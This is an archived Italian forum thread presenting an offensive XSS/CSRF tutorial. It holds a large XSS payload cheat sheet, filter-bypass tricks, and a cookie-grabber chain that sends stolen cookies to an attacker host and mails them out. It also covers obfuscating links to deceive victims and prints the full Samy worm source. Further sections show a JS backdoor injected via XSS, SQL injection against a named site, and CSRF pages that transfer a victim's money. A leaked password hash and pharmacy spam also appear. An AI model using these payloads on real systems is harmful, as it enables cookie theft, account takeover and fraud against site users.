<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <title>Methode - XSS</title>
</head>
[index](index.html) [Hacking](hacking.html)

a| ls  -> 5h6Xsxab.txt
a|cat 5h6Xsxab.txt
3dVgsa3v4

.htpasswd
root:RW3Q1nyZEe0jw

"><script>alert('prova xss')</script>


"><script>alert(document.cookie)</script>


<script>location.href="http://www.evilsite.org/cookiegrabber.php?cookie="+escape(document.co

okie)</script>

<scr<script>ipt>alert('XSS');</scr</script>ipt>

<script>alert(String.fromCharCode(88,83,83))</script>

<img src=foo.png onerror=alert(/xssed/) />

<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>

<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>

<marquee><script>alert('XSS')</script></marquee>

<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">

<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">

<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

"><script>alert(0)</script>

"><script src=http://yoursite.com/your_files.js></script>

</title><script>alert(/xss/)</script>

</textarea><script>alert(/xss/)</script>

<IMG LOWSRC=\"javascript:alert('XSS')\">

<IMG DYNSRC=\"javascript:alert('XSS')\">

<font style='color:expression(alert(document.cookie))'>

'); alert('XSS

<img src="javascript:alert('XSS')">

<script language="JavaScript">alert('XSS')</script>

[url=javascript:alert('XSS');]click me[/url]

<body onunload="javascript:alert('XSS');">

<body onLoad="alert('XSS');"

[color=red' onmouseover="alert('xss')"]mouse over[/color]

"/></a></><img src=1.gif onerror=alert(1)>

window.alert("Bonjour !");

<div

style="x:expression((window.r==1)?'':eval('r=1;alert(String.fromCharCode(88,83,83));'))">

<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>

"><script alert(String.fromCharCode(88,83,83))</script>

'>><marquee><h1>XSS</h1></marquee>

'">><script>alert('XSS')</script>

'">><marquee><h1>XSS</h1></marquee>

<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">

<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;
URL=http://;URL=javascript:alert('XSS');\">

<script>var var = 1; alert(var)</script>

<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

<?='<SCRIPT>alert("XSS")</SCRIPT>'?>

<IMG SRC='vbscript:msgbox(\"XSS\")'>

" onfocus=alert(document.domain) "> <"

<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>

<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS

perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out

perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out

<br size=\"&{alert('XSS')}\">

<scrscriptipt>alert(1)</scrscriptipt>

</br style=a:expression(alert())>

</script><script>alert(1)</script>

"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

[color=red width=expression(alert(123))][color]

<BASE HREF="javascript:alert('XSS');//">

Execute(MsgBox(chr(88)&chr(83)&chr(83)))<

"></iframe><script>alert(123)</script>

<body onLoad="while(true) alert('XSS');">

'"></title><script>alert(1111)</script>

</textarea>'"><script>alert(document.cookie)</script>

'""><script language="JavaScript"> alert('X \nS \nS');</script>

</script></script><<<<script><>>>><<<script>alert(123)</script>

<html><noalert><noscript>(123)</noscript><script>(123)</script>

<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">

'></select><script>alert(123)</script>

'>"><script src = 'http://www.site.com/XSS.js'></script>

}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>

<SCRIPT>document.write("XSS");</SCRIPT>

a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);

='><script>alert("xss")</script>

<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>

<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>

">/XaDoS/><script>alert(document.cookie)</script><script

src="http://www.site.com/XSS.js"></script>

data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=





Code:
[+]Analisi di un attacco

Il sito www.caziotio.it ha un campo search, proviamo a cercare il nostro codice javascript e

l'url generato dovrebbe essere cosÃ¬:

http://www.caziotio.it/default.asp?rif=1&tiporicerca=2&strRicerca1=
%22%3E%3Cscript%3Ealert('prova');%3C/script%3E&strRicerca2=
&strRicerca3=&sel1=AND&sel2=AND&RicInt1=1&RicInt2=0&RicInt3=0

Vediamo che la variabile strRicerca1 contiene il nostro codice. Proviamo a Passarlo

direttamente e togliere le parti superflue:

http:www.caziotio.it/default.asp?rif=1&tiporicerca=2&str
Ricerca1="><script>alert(document.cookie);</script>

Ecco che â€œForseâ€ vedremo i nostri cookie apparire a schermo.





Code:
[+]Come Eludere I Filtri

Molte volte i fitltri si occupano semplicemente di cancellare o alterare, se presenti,

determinati simboli o parole, tipo chessÃ² aggiungere uno â€œ/ â€œ se il primo carattere Ã¨ â€œ<â€,

oppure altri metodi non molto efficaci e facilmente oltrepassabili.

Il metodo piÃ¹ classico per eludere certi filtri Ã¨ chiudere il tag, aggiungendo â€œ> prima del

codice da eseguire.
Molte molte invece ci si trova davanti ad un filtro creato con una semplice stringa del

tipo:

$var = str_replace ("<script>", "script", $var);

Che blocca l'uso di <script> & di script, impedendoci di eseguire il codice javascript tra i

due tag. In questo caso Ã¨ facile, basta usare un qualunque altro codice javascript come

quelli sopra riportati:

<IMG SRC='vbscript:msgbox(\"XSS\")'>

Altre volte invece possimao trovarci davanti ad un particolare filtro chiamato addslashes

che si occupa appunto di aggiungere un carattere '\' davanti a tutti i caratteri ' , in tal

modo rende nullo il codice.
Come bypassarlo? Semplice:  o codifichiamo i nostri codici javascript che vogliamo immettere

nell alert in decimali(&#116),hex(%74%0A),ascii(abct) e base64(dAoK); oppure cerchiamo un

codice javascript che non usi i caratteri bloccati, esempio:

}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>

o

<script>alert(1);</script>

Come detto sopra ci sono moltissime cheat sheet su internet e poi basta imparare il

javascript e con poche modifiche si riescono ad eludere filtri apparentemente impossibili,

dipende tutto da voi e dalla vostra fantasia.





Code:
[+]Sfruttare XSS Con Un Cookie Grabber

Indubbiamente il metodo piÃ¹ usato e il piÃ¹ â€œefficaceâ€.
Consiste nell'includere un file javascript nella variabile che viene stampata, il quale file

richiama una pagina in php che si occupa di loggare i Cookie dell'user che apre il link

appositamente preparato.

Praticamente:

Codice Javascript:

"><script src="http://www.nostrosito.com/cookiescript.js"></script>

All'interno del file cookiescript.js ci scriveremo il codice che passa il Cookie ad una

pagina php:

<script>location.href="http://nostrosito.com/cookie.php?cookie=</script>

Il file cookie.php invece conterrÃ  il codice php che si occupa di farci recapitare il

cookie:

<? mail("nostra@mail.com","Ecco il cookie rubato",$_GET['cookie']; ?>

Uppato il tutto l'url sarÃ  all'incirca:

http://www.caiotizio.it/default.asp?rif=1&tiporicerca=2&strRicerca1="><script

src="http://www.nostrosito.com/cookiescript.js"></script>


Code:
[+]Offuscamento dell'url

Ora dobbiamo occuparci di come nascondere l'url sopra descritta in modo tale che un utente

normale non si accorga di nulla (molte persone non si accorgono neppure di un link con

all'interno del javascript code ben in vista,comunque noi facciamo le cose per bene)

Abbiamo diverse opzioni:

1#-- P0ssiamo nascondere l'url attraverso alcuni servizi quali tinyurl(www.tinyurl.com),che

ci permette di rendere un qualsiasi indirizzo web qualcosa del tipo:

http://tinyurl.com/2rery1


2#-- Possiamo convertire l'intera url in hex:

http://www.caiotizio.it/default.asp?rif=1&tiporicerca=2&strRicerca1=223e3c736372697074207372

633d22687474703a2f2f7777772e6e6f7374726f7369746f2e636f6d2f636f6f6b69657363726970 742e6a73223e

3c2f7363726970743e

In questo modo sembrerÃ  un normalissimo link.

Se L'utente aprirÃ  il link e tutto va a bu0n fine vedremo nella nostra casella postale i

c00kie della vittima in questi0ne.







Code:
[+]XSS Non Sfruttabili

Alcuni siti web hanno avuto almeno la furbizia di filtrare le richieste HTTP POST ed HTTP

GET in modo da non consentire redirect e quindi furto di Cookie.
PerÃ² se riusciamo comunque ad eseguire del codice esterno, possiamo tuttavia creare una

pagina web simile a quella originale ed usarla per appropiarci di password o altri dati

sensibili.

Esempio:
Pagina da includere: http://vuln.xssed.net/thirdparty/scripts/ckers.org.js

L'url del sito sarÃ :

http://sitovittima.it/paginavulnerabile.php?varvuln="><script

src="http://vuln.xssed.net/thirdparty/scripts/ckers.org.js"></script>

La pagina in js, se il sito non filtra, puÃ² anche essere scritta in HTML, e sarÃ  quindi
http://sitodelpoverocaio.it/paginavulnerabile.php?varvuln="><script

src="http://vuln.xssed.net/thirdparty/scripts/ckers.org.html"></script>

In questo modo all'url creato corrisponderÃ  la pagina che in js ( o HTML ) che abbiamo

incluso.






Code:
[+]Altri tipi di XSS:

CHi ha mai dett che in una xss possiamo solo inserire un testo o far comparire un alert o

giocare con i cookie..?
POssiamo fare molte altre cose come includere immagini,video,redirect e quant'altro..
Ecco qui di seguito una piccola lista di codice Javascript alternativo:

Stampare un'immagine nella pagina vulnerabile:

<IMG SRC="http://www.tuosito.com/img.png">

Visualizzare un video:

<EMBED SRC="http://www.tuosito.com/video.swf">

Redirect verso un altra pagina web\video\immagine:

<script>window.open("http://www.tuosito.com/pagina.html")</script>

*al posto di ../pagina.html possiamo mettere tutto: video.swf / img.png   / ecc..





Ora cancelliamo tutto tranne questi pochi caratteri iniziali(che servono per riconoscere ed

accettare questo file come .gif)
Ed inseriamo l'ormai famoso codice Javascript:

GIF89a<script>alert("XSS")</script>

Ora salviamo l'immagine (sempre in .gif) e facciamo l'upload sul sito vittima / forum /

sezione commenti ..
Ora questa xss Ã¨ diventata permanente poichÃ¨ chiunque vada sull'url contenente questa

immagine.gif potrÃ  oservare il nostro alert!
(Mozilla FireFox non mostra sempre questi tipi di alert, IE invece si)

Ricordiamoci che per ogni estensione di immagine quei pochi caratteri cambiano, qui vi

riporto una lista dei suddetti caratteri:

-PNG = â€°PNG

-GIF = GIF89a

-JPG = Ã¿Ã˜Ã¿Ã  JFIF

-BMP = BMFÃ–




Code:
[+] XSS W0rm:

Questo Ã¨ un argomento non molto sviluppato proprio perchÃ¨ Ã¨ ancora in fase di sviluppo,

basti pensare infatti che il primo w0rm legato alle XSS Ã¨ nato nel 2005 e si chiamava Samy;
Samy era un w0rm per myspace,e per evitare le restrizioni del provider, che non consente

l'upload di javascript, l'utente ha inserito lo script nei CSS e Internet Explorer ha fatto

il resto. Il codice, infatti, avrebbe dovuto essere considerato un CSS non valido, ma IE lo

ha eseguito e lo ha fatto propagare per i membri della community.
Attraverso questo verme Samy ha infettato piÃ¹ di un milione di account e continuava a

replicarsi aggiungendo amici al profilo dell utente creatore del w0rm.(alle 9.30 della

stessa notte le richieste erano milioni e continuavano ad affluire ogni millesimo di

secondo, cosÃ¬ facendo myspace Ã¨ caduto ed Ã¨ andato offline)
Code of Samy:

<div id=mycode style="BACKGROUND: url('java
script:eval(document.all.mycode.expr)')" expr="var B=String.fromCharCode(34);var

A=String.fromCharCode(39);function g(){var C;try{var

D=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return C}else{return

eval('document.body.inne'+'rHTML')
}}
function getData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function

getQueryParams(){var E=document.location.search;var F=E.substring(1,E.length).split('&');var

AS=new Array();for(var O=0;O<F.length;O++){var I=F[O].split('=');AS[I[0]]=I[1]}return AS}var

J;var AS=getQueryParams();var L=AS['Mytoken'];var

M=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.

myspace.com'+location.pathname+location.search}else{if(!M){getData(g())}main()}function

getClientFID(){return findIn(g(),'up_launchIC( '+A,A)}function nothing(){}function

paramsToString(AV){var N=new String();var O=0;for(var P in AV){if(O>0){N+='&'}var

Q=escape(AV[P]);while(Q.indexOf('+')!=-1){Q=Q.replace('+','%2B')}while(Q.indexOf('&')!=-1){Q

=Q.replace('&','%26')}N+=P+'='+Q;O++}return N}function httpSend(BH,BI,BJ,BK){if(!J){return

false}eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeade

r('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK

.length)}J.send(BK);return true}function findIn(BF,BB,BC){var R=BF.indexOf(BB)+BB.length;var

S=BF.substring(R,R+1024);return S.substring(0,S.indexOf(BC))}function

getHiddenParameter(BF,BG){return findIn(BF,'name='+B+BG+B+' value='+B,B)}function

getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&'}var U=BG+'=';var

V=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var

Y=W.substring(0,X);return Y}function getXMLObj(){var

Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else

if(window.ActiveXObject){try{Z=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=new

ActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return Z}var AA=g();var

AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);var AD=AC.indexOf('D'+'IV');var

AE=AC.substring(0,AD);var

AF;if(AE){AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF='

but most of all, samy is my hero. <d'+'iv id='+AE+'D'+'IV>'}var AG;function

getHome(){if(J.readyState!=4){return}var

AU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','</td>');AG=AG.substring(61,AG.length);if(

AG.indexOf('samy')==-1){if(AF){AG+=AF;var AR=getFromURL(AU,'Mytoken');var AS=new

Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();

httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='+AR,postHero,'POST',params

ToString(AS))}}}function postHero(){if(J.readyState!=4){return}var AU=J.responseText;var

AR=getFromURL(AU,'Mytoken');var AS=new

Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getH

iddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='

+AR,nothing,'POST',paramsToString(AS))}function main(){var AN=getClientFID();var

BH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;J=getXMLObj();httpSen

d(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_v

erify&friendID=11851658&Mytoken='+L,processxForm,'GET')}function

processxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var

AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var AS=new

Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to

Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing,'POS

T',paramsToString(AS))}function httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return

false}eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xml

http2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setReque

stHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return true}"></DIV>


Ora, senza stare a spiegare riga per riga possiamo capire che i w0rm xss sono pericolosi per

sistemi e community quali myspace,yahoo ecc..
Vi basti pensare che in tutto i w0rm si contano sulle dita:

DATA:           NOME W0RM        BERSAGLIO

01/11/2008      New Orkut Worm      Orkut
08/07/2008     JustinTV Worm      Justin TV
24/01/2008     Yamanner      Yahoo! Mail Service
24/01/2008     hi5 Worm      hi5
24/01/2008     Gaia Worm      Gaiaonline
24/01/2008     Orkut Worm      Orkut
24/01/2005     Samy Worm        Myspace

Non reputo ci sia molto altro da dire, per questo argomento non ci sono regole o tutorial,

ognuno dovrebbe riuscire a trovare una vulnerabilitÃ  che gli permetta di inserire codici

simili a questie comunque sia, non Ã¨ una cosa che personalmente mi interessa.





Code:
[+] JavaScript Shell -  XSS & Backdoor

Ora parliamo di una cosa m000lto c00l!! ;-)
Sfruttiamo una vulnerabilitÃ  XSS per inniettare una backdoor a discapito di un povero user

vittima.

Procedimento:
Grazie ad un apposito tool creato da Inj3ct-it crew possiamo fare qualcosa di molto piÃ¹

pericoloso che un semplice alert, anche questa Ã¨ una delle tecniche che le persone non

conoscono con le XSS e cosÃ¬ facendo, restando ingnoranti, e le sottovalutano.

Requisiti 2 files:

-JsBack.php (from Inj3ct-it)

-shell.js (from Inj3ct-it)

Come primo passo dobbiamo uplodare sul nostro sito i 2 files jsback.php & shell.js,
e modificare le impostazioni iniziali( password e username per accedere nel file jsback.php

mentre in shell.js dobbiamo settare l'url e altro(troverete istruzioni dettagliate

all'interno dello stesso)).
Adesso supponiamo di aver trovato un xss su un sito che ci permette di includere javascript

code, possiamo quindi scrivere:

http://sitovittima.com/vuln.php?x=1">/XaDoS/><script

src="http://nostrosito.com/shell.js"></script>

facendo cliccare come al solito alla vittima il nostro cattivissimo indirizzo questa volta

succederÃ  qualcosa di diverso:

Essendo l'utente collegato e loggato ad il sitovittima in questione attraverso la shell.js

nella nostra pagina privata jsback.php ci appariranno i suoi cookies! ma non solo: il suo

ip, informazioni riguardanti la sua macchina ecc.. in piÃ¹ grazie a questa particolare pagina

ci sono altre funzioni come keylogger/esecuzione comandi/proxy/ CSRF(di cui tratterÃ² nel

prossimo capitolo) ecc
che perÃ² potrete vedere sul sito degli autori (Inj3ct-it).

Capite quindi che .. non si scherza con le XSS !! ;-)





Code:
[!] Le XSS stanno sempre bene con le SQL: una dentro l'altra

Quanti di voi sanno quanto spesso cpaita che uno trovi una SQL e scopri in seguito che la

stessa variabile buggata Ã¨ vuln a XSS; oppure, ancora meglio, quante volte capita che ci si

trova davanti ad una XSS e poco dopo trovi qualcuno che ti dice:"hey! ma qui c'Ã¨ un sql!"(

s3rg3770 :) )
Bene possiamo quindi giungere alla conclusione che stanno bene insieme.

Ma se vi dicessi che UNa puÃ² perfino stare dentro l'altra?
suona strana come frase vero..
VI spiego bene:
Semplicemente una volta trovata una sql, possiamo benissimo usare il nostro solito comando

char()

in modo un po' stravagante:

come sappiamo di solito inseriamo del codice, convertito in ASCII. Ma allora se provassimo

ad inserire codice JavaScript ?? su, proviamoci.
Passiamo subito al codice:

abbiamo la nostra tipica XSS:

<script>alert('xssbyXaDoS')</script>

e vorremmo inserirla nell'SQL..ma ricordiamoci
che dobbiamo convertirla in ASCII per far si che ritorni l'alert;
quindi attraverso un normalissimo ASCII converter nel web la convertiamo in:

60 115 99 114 105 112 116 62 97 108 101 114 116 40 39 120 115 115 98 121 88 97 68 111 83 39

41 60 115 99 114 105 112 116 62

bene.
ora sfruttiamo un po' di conoscenze in ambito sql, cmoe sappiamo dovremo separare i numeri

da virgole, al posto degli spazi in questo modo:

60,115,99,114,105,112,116,62,97,108,101,114,116,40,39,120,115,115,98,121,88,97,6 8,111,83,39,

41,60,115,99,114,105,112,116,62

ora possiamo metterlo dentro il nostro comandino magico..

char(60,83,67,82,73,80,84,62,97,108,101,114,116,40,39,120,115,115,98,121,120,97, 100,111,115,

39,41,60,47,115,99,114,105,112,116,62)

ed ora..bhe, riprendiamo la nostra SQL
ex.
http://www.aslromah.it/news/home_notizia.php?ID_News=-99%20union%20all%20select%201,2,3,4,5,

6,7,8,910,11,12--

leggiamo il numero in cui printera i risultati, nel nostro caso il 4, ed inseriamo il codice

ascii.ORA dovremmo avere:

http://www.aslromah.it/news/home_notizia.php?ID_News=-99%20union%20all%20select%201,2,3,char

(60,83,67,82,73,80,84,62,97,108,101,114,116,40,39,120,115,115,98,121,120,97,100, 111,115,39,4

1,60,47,115,99,114,105,112,116,62),5,6,7,8,9,10,11,12--

linkate..eh...puff
appere il nostro alert dentro l'SQL. Semplicemente inutile ma.. divertente.


Code:
[!] CSRF o XSRF: Cross Site Request Forgery


Ora che abbiamo concluso con le XSS vorrei presentare un attacco simile ma non certamente

uguale alle XSS, piÃ¹ potente Ã¨ piÃ¹ dannoso per un ignara vittima.

Innanzitutto bisogna capire la sostanziale differernza tra le XSS e le CSRF: Ã¨ molto

semplice, mentre le Xss si basano sullo spingere un determinato user a cliccare su un url

maligna in modo tale da prelevare i suoi cookies o le sue informazioni di accesso ad un sito

web, Le CSRF si basano sullo sfruttamento di un user vittima che, essendo loggato ad un

determinato sito, ci permette di eseguire codici maligni attraverso il suo stesso account.

Proprio per questo Ã¨ una tecnica piÃ¹ difficile da individuare ed eliminare per un admin,

poichÃ¨ tutte le azioni commesse risulteranno eseguite da un user qualunque(la nostra

vittima,che non sospetta di nulla).

Riassumendo quindi le Cross Site Request Forgery ci permettono di spedire qualunque tipo di

richiesta HTTP ad un sito attraverso una specifica vittima che compierÃ  ogni azione per noi

a suo discapito.

Vediamo ora piÃ¹ nel dettaglio questo tipo di tecnica:

Ipotizziamo( e scrivo ipotizziamo perchÃ¨ se fosse cosÃ¬ semplice sarei miliardario) che un

utente Ã¨ loggato ad un sito che permette di avere alcuni servizi speciali quali il possesso

di un conto bancario ed il trasferimento di soldi ($.$).
Avendo quindi un normale account il sito permette a questa persona di eseguire alcune

transazioni monetarie.
Il codice quindi di una pagina per trasferire soldi in un servizio di e-banking potrebbe

essere in generale:

<form method="POST" action="spediscoeuro.php" name="spediscoeuro">
        <div>Quanto trasferisci: <input type="text" name="euro"></div>
        <div>A:   <input type="text" name="toname"></div>
        <div>lol: <input type="text" name="tolol"></div>
        <div>asd: <input type="text" name="toasd"></div>
        <div>omg: <input type="text" name="toomg"></div>
        <div><input type="submit" name="submit" value="Buy"></div>
     </form>

attraverso queste righe un user puÃ² trasferire denare su un diverso account bancario (nella

realtÃ  non Ã¨ cosÃ¬ semplice ma Ã¨ solo per farvi capire)

Quando l'utente spedisce la richiesta la pagina spediscieuro.php eseguirÃ  il trasferimento,

attraverso un codice del tipo:

/* spediscieuro.php */
     <?
     session_start();
     if(isset($_REQUEST['euro']))
          $euro = $_REQUEST['euro'];
     else
          die("Specificare la somma di denar0!"); //toname sarebbe l'account destinatario ,

quello che riceve la somma
     if(isset($_REQUEST['toname']))
          $toname = $_REQUEST['toname'];
     else
          die("Specificare dove trasferire la somma");
     if(isset($_REQUEST['tolol']))
          $toabi = $_REQUEST['tolol'];
     else
          die("specificare lol");
     if(isset($_REQUEST['toasd']))
          $tocab = $_REQUEST['toasd'];
     else
          die("Specificare asd");
     if(isset($_REQUEST['toomg']))
          $tocin = $_REQUEST['toomg'];
     else
          die("Specificare omg");
    
    
     send_money($euro, $toname, $tolol, $toasd, $toomg);
      
     ?>


Ora un attaccante, grazie ai REQUEST potrebbe usufruire di richieste GET maligne, per

spedire i soldi in un determinato posto , rubandoli.
Ora arriva la parte importante:
Noi attaccanti dobbiamo riuscire a dirigere l'utente, mentre Ã¨ loggato alla banca, su una

pagina web nostra o anche su un immagine o video..
esempio:(mentre l'utente sta guardando il suo ammontare per esempio..)
ATTACCANTE:"Vieni a vedere questa bellssima foto! Link: http://sitonostro/immagine.html"

Ora la pagina ../immagine.html dovrebbe essere struttura piÃ¹ o meno cosÃ¬:



   <html>
    <head><title>Immagine bellissima</title></head>
    <body>
<img

src="http://bancavittima.it/spediscieuro.php?euro=TUTTI&toname=HACKER&tolol=123456&toasd=123

456&toomg=X">
    </body>
   </html>


Come potete osservare da soli, l'utente mentre guarda l'immagine bellissima Ã¨

contemporaneamente collegato alla banca ed eseguirÃ  ignaro di tutto un trasferimento di

TUTTI i suoi soldi verso HACKER(attaccante). Ora avete capito? qui sta la bellezza di questi

tipi di attacco: Ã¨ l'utente che tramite i suoi cookie e il suo account esegue richieste HTTP

piÃ¹ o meno dannose per noi(in questo caso direi m0lto dannose!!).


Ora, probabilmente nessuna banca Ã¨ cosÃ¬ stupida da usare richieste come REQUEST ma

probabilmente userebbe per un transito monetario richieste POST. In questo caso la nostra

pagina immagine.html sarebbe diventata:


     <html>
     <head>
     <title>Immagine bellissima</title>
     <script>
     rubaeuro() {
          iframe = document.frames["rubaeuro"];
          iframe.document.ruba.submit();
     }
     </head>
     <body onload="rubaeuro()">
     <div><img src="immagine_vera_bellissima.jpg"></div>
     <iframe name="rubaeuro" display="none">
          <form method="POST" name="ruba"
           action="http://bancavittima.com/spediscieuro.php">
               <input type="hidden" name="euro" value="TUTTI">
               <input type="hidden" name="toname" value="HACKER">
               <input type="hidden" name="tolol" value="123456">
               <input type="hidden" name="toasd" value="123456">
               <input type="hidden" name="toomg" value="X">
          </form>
     </iframe>
     </body>
     </html>


iniziate a capire da soli vero ;-) ?
Attraverso la sessione ATTIVA dell'utente alla banca eseguiamo le nostre richieste di

trasferimento !
Questo era solo un esempio per farvi capire la pericolositÃ  di un bug del genere in siti di

e-banking o simili.







Code:
[+]P0st_fazione + Ringraziamenti

Dopo questo paper spero esauriente, forse inizierete a capire che la gente spesso

sottovaluta troppo vulnerabilitÃ  come XSS & CSRF ..credendo che un SQL o una RFI siano

migliori, ma senza capire che la dove non sarÃ  possibile eseguire una stupida sql su

index.php?id=[sql] bisognerÃ  affidarsi a vulnerabilitÃ  piÃ¹ sottili, che richiedono molta piÃ¹

astuzia ed ingegno.


th4nks to:

Langy / Xylitol / Nexus / Uber0n / GsC / plucky / Osyris / security-sh3ll / Security Code

Team / Infernet / R4zor_CrasH / xssed / xssing / DoMin0 /
Inj3ct-it


Mirror

This post was last modified: 05-08-2009 10:32 AM by Langy.
Firefox Linux
Browser e O.S.: 
05-08-2009 12:07 AM 	
Visit this user's website Find all posts by this user 	Quote this message in a reply
xados
Moderator
****


Posts: 69
Group: Moderators
Joined: Oct 2008
Status: Offline
Reputation: 1
	
Post: #2
RE: Book Of XSS/CSRF: BASE+ADVANCED

soon on milw0rm.com :)
Firefox Windows XP/2003
Browser e O.S.: 
07-08-2009 04:57 PM 	
Visit this user's website Find all posts by this user 	Quote this message in a reply
Joyb0y
Banned


Posts: 16
Group: Banned
Joined: Mar 2009
Status: Offline
	
Post: #3
RE: Book Of XSS/CSRF: BASE+ADVANCED

I'm the king is known xss in :D
Vodka With The Days ..
Firefox Windows XP/2003
Browser e O.S.: 
20-09-2009 07:58 AM 	
Visit this user's website Find all posts by this user 	Quote this message in a reply
xados
Moderator
****


Posts: 69
Group: Moderators
Joined: Oct 2008
Status: Offline
Reputation: 1
	
Post: #4
RE: Book Of XSS/CSRF: BASE+ADVANCED

you drink too much man. Icon_question
Firefox Windows XP/2003
Browser e O.S.: 
20-09-2009 08:50 PM 	
Visit this user's website Find all posts by this user 	Quote this message in a reply
Joyb0y
Banned


Posts: 16
Group: Banned
Joined: Mar 2009
Status: Offline
	
Post: #5
RE: Book Of XSS/CSRF: BASE+ADVANCED

I do not like being drunk, man my head extracts :D
Vodka With The Days ..
Firefox Windows XP/2003
Browser e O.S.: 
21-09-2009 10:21 AM 	
Visit this user's website Find all posts by this user 	Quote this message in a reply
rohan.decate
GB - Newbie
*


Posts: 3
Group: Registered
Joined: Nov 2010
Status: Offline
Reputation: 0
	
Post: #6
RE: Book Of XSS/CSRF: BASE+ADVANCED

man why not in english ..what the fucking language u8 use
Firefox Linux RedHat
Browser e O.S.: 
29-11-2010 06:13 AM 	
Find all posts by this user 	Quote this message in a reply
rohan.decate
GB - Newbie
*


Posts: 3
Group: Registered
Joined: Nov 2010
Status: Offline
Reputation: 0
	
Post: #7
RE: Book Of XSS/CSRF: BASE+ADVANCED

man why not in english ..what the fucking language u8 use
Firefox Linux RedHat
Browser e O.S.: 
29-11-2010 06:14 AM 	
Find all posts by this user 	Quote this message in a reply
vieniatem
GB - Junior Member
**


Posts: 32
Group: Registered
Joined: Jan 2013
Status: Offline
Reputation: 0
	
Post: #8
achat cialis commande de cialis

achat cialis generique pas cher


Get TADALAFIL (Cialis) just as your medical practitioner prescribes. Your health care experienced will prescribe the dose which can be suitable yourself. TADALAFIL may perhaps potentially be taken about when each and every working day by most consumers. And considering that sexual stimulation is necessary for TADALAFIL to work, you reply to your lover provided that the moment is precise.
Ccegfblfww
Most males weren't bothered with the unwelcome consequences sufficient to stop acquiring Tadalafil. However a scarce incidence, males who knowledge an erection for extra than several various several hours (priapism) have to search for out immediate well being treatment discover. Go about your medical issues and medications with all the wellbeing practitioner to ensure Tadalafil is correct to fit your demands which you'll be healthful enough for sexual activity.

These mixtures could bring about a unpredicted, unsafe drop in blood pressure level amount. Won't eat alcoholic drinks in excess (to some phase of intoxication) with Tadalafil. This combine may perhaps quite possibly improve your probabilities of getting dizzy or reducing your blood pressure level degree. Tadalafil would not guard somebody or his lover from sexually transmitted overall health situations, which incorporates HIV
Opera Windows 9x/NT/2000
Browser e O.S.: 
16-01-2013 08:55 PM 	
Find all posts by this user 	Quote this message in a reply
vieniatem

View a Printable Version
Send this Thread to a Friend
Subscribe to this Thread | Add Thread to Favorites 	

Home Page | Contact Us | Lite (Archive) Mode | RSS
Copyright © GoogleBig and WP - Marks mentioned in GoogleBig are exclusive of their respective owners.
These Marks are mentioned in Googlebig only for informative purpose and GoogleBig does not have any right about them.
